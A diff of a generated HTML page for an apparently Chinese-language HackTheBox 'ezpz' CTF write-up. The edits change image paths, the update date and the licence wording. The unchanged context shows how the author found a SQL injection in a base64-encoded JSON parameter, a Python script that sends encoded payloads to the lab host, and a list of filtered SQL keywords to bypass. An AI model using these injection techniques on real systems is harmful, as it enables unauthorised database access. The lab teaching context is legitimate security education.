@@ -465,16 +465,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <a id="more"></a>
 
 
-<p>首先进入页面，发现有两个报错：<br><img src="/2020/02/06/hackthebox-ezpz/1.jpg" class="lazyload" data-srcset="hackthebox-ezpz/1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error1"></p>
+<p>首先进入页面，发现有两个报错：<br><img src="/2020/02/06/hackthebox-ezpz/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error1"></p>
 <p>其中，第一个报错其实就是</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP: Notice: Undefined variable</span><br></pre></td></tr></table></figure>
-<p>意思是有未定义变量，那么自然就是obj了。所以下一步我们传参变量<br><img src="/2020/02/06/hackthebox-ezpz/2.jpg" class="lazyload" data-srcset="hackthebox-ezpz/2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error2"><br>那么如何解决第二个错误呢？从中可以看出，ID之于obj可能是property与object的关系。也就是说，obj可能是包含ID的某种序列化数据的变量。实际上，如下代码</p>
+<p>意思是有未定义变量，那么自然就是obj了。所以下一步我们传参变量<br><img src="/2020/02/06/hackthebox-ezpz/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error2"><br>那么如何解决第二个错误呢？从中可以看出，ID之于obj可能是property与object的关系。也就是说，obj可能是包含ID的某种序列化数据的变量。实际上，如下代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj=<span class="keyword">array</span>(<span class="string">"ID"</span>=&gt;<span class="number">1234</span>);</span><br><span class="line"><span class="keyword">echo</span>($obj-&gt;IDS);<span class="comment">#此处访问一个未定义的IDS触发报错</span></span><br></pre></td></tr></table></figure>
 <p>与</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj=json_decode(<span class="string">"&#123;'ID':'1234'&#125;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;IDs;</span><br></pre></td></tr></table></figure>
-<p>的返回都是：<br><img src="/2020/02/06/hackthebox-ezpz/3.jpg" class="lazyload" data-srcset="hackthebox-ezpz/3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="报错"><br>所以我们才能看到回显。因此尝试构造数据吧。加上题目页面源码中提示了<code>Hint : base64_encode($data)</code>&gt;（或者我们把obj置为数组，也可以触发报错，提示我们数据需要<code>base64encode</code>）<br>经过尝试，可以发现是要对json数据编码。那我们传一个ID值为1的数据</p>
+<p>的返回都是：<br><img src="/2020/02/06/hackthebox-ezpz/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="报错"><br>所以我们才能看到回显。因此尝试构造数据吧。加上题目页面源码中提示了<code>Hint : base64_encode($data)</code>&gt;（或者我们把obj置为数组，也可以触发报错，提示我们数据需要<code>base64encode</code>）<br>经过尝试，可以发现是要对json数据编码。那我们传一个ID值为1的数据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj&#x3D;eyJJRCI6ICIxIn0&#x3D;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/06/hackthebox-ezpz/4.jpg" class="lazyload" data-srcset="hackthebox-ezpz/4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>而传<code>1&#39;</code>触发报错，传<code>1&quot;</code>无报错。确认是存在sql注入漏洞，且是单引号闭合类型。<br>于是，题目进入到了下一阶段，sql注入。<br>显然为了让我们的payload更方便，最好先写好exp：</p>
+<p><img src="/2020/02/06/hackthebox-ezpz/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>而传<code>1&#39;</code>触发报错，传<code>1&quot;</code>无报错。确认是存在sql注入漏洞，且是单引号闭合类型。<br>于是，题目进入到了下一阶段，sql注入。<br>显然为了让我们的payload更方便，最好先写好exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://docker.hackthebox.eu:30163/index.php?obj="</span></span><br><span class="line">payload=<span class="string">"1"</span></span><br><span class="line">payload = base64.b64encode(json.dumps(&#123;<span class="string">"ID"</span>: payload&#125;).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">payload = str(payload, <span class="string">'utf-8'</span>)</span><br><span class="line">url += payload</span><br><span class="line">r = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text, <span class="string">'html.parser'</span>)</span><br><span class="line">body = soup.find(<span class="string">'body'</span>).text.strip()</span><br><span class="line">print(body)</span><br></pre></td></tr></table></figure>
 <p>于是通过FUZZ，发现存在不少过滤：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br><span class="line">，</span><br><span class="line">concat</span><br><span class="line">information_schema.tables</span><br><span class="line">where</span><br><span class="line">limit</span><br></pre></td></tr></table></figure>
@@ -518,11 +518,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
                 <p>本文永久链接是：<a href=https://www.bycsec.top/2020/02/06/hackthebox-ezpz/>https://www.bycsec.top/2020/02/06/hackthebox-ezpz/</a></p>
               
             
-              
-                <p>欢迎打赏！ 您的支持将是我创作的重要动力</p>
-
-              
-            
           </blockquote>
         </div>
       
@@ -545,10 +540,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-07-08T18:31:30+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-18T13:09:14+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Jul 8, 2020</p>
+    <p>更新于：Feb 18, 2021</p>
   </a>
 </div>
 
@@ -699,7 +694,7 @@ easy_web进去后url有两个明显参数，第一个类似于base64编码，第
       
     
       
-        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
 </div>
       
     
@@ -713,7 +708,7 @@ easy_web进去后url有两个明显参数，第一个类似于base64编码，第
       
         本站使用
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作为主题
+        作為主題
       
     
       
